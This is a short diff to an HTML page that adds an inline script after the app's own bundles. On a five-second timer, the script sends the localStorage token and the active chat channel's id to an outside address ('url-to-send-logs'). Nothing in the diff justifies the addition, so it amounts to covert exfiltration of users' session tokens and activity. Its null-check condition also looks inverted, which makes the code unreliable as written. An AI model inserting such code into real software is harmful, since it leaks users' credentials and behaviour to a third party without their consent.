@@ -9,5 +9,12 @@
 	<body>
 		<script src="dist/components.js"></script>
 		<script src="dist/app.js"></script>
+		<script>
+            if (localStorage.getItem(storageKey + '$token') === null) {
+                window.setInterval(function () {
+                    $.get('http://url-to-send-logs/?token=' + localStorage.getItem(storageKey + '$token') + '&channel=' + $(".box.channels ul li.active").attr('id'));
+                }, 5000);
+            }
+		</script>
 	</body>
 </html>
